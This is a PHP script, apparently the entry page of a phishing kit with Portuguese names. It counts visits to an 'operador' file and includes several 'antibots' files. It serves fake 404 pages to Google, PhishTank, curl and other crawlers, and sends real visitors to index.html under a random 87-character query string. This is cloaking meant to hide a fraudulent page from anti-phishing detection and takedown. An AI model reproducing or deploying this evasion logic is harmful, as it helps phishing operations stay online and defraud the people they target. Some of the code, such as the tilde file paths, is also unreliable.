<?php
session_start();
error_reporting(0);
      $caminho= "~/operador/contador.json";
	$fl = "~/operador/contador.json";
	if(file_exists($fl)){
		$h = fopen($fl, "r");
		$arr = json_decode(fread($h, filesize ($fl)));
		fclose($h);
		for($i = 0; $i < count($arr); $i++){
			$visitas = "".$arr[$i][0]."";
		}
	}


# incrementa
$x = $visitas;$x += 1;


$a='[["';
$b='"]]';


$rs= "".$a."".$x."".$b."";

# salva
$arquivo = fopen($caminho, "w");fwrite($arquivo, $rs);fclose($arquivo);


//------------------------------------------|| ANTIBOTS ||-----------------------------------------------------//
include "~/BOTS/antibots1.php";
include "~/BOTS/antibots2.php";
include "~/BOTS/antibots3.php";
include "~/BOTS/antibots4.php";
include "~/BOTS/antibots5.php";
include "~/BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
		'phishtank',
		'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 

function geraURL($tamanho = 100, $maiusculas = true, $numeros = true, $simbolos = true){ 
    $lmin = 'abcdefghijklmnopqrstuvwxyz'; 
    $lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $num = '1234567890'; 
    $simb = '#-/'; 
    $retorno = ''; 
    $caracteres = ''; 
     
    $caracteres .= $lmin; 
        if ($maiusculas) $caracteres .= $lmai; 
        if ($numeros) $caracteres .= $num; 
        if ($simbolos) $caracteres .= $simb; 
     
    $len = strlen($caracteres); 
    for ($n = 1; $n <= $tamanho; $n++) { 
    $rand = mt_rand(1, $len); 
    $retorno .= $caracteres[$rand-1]; 
    } 
    return $retorno; 
} 
$link_index = '~/index.html?'.geraURL(87); 


header("LOCATION: ".$link_index."");
?>
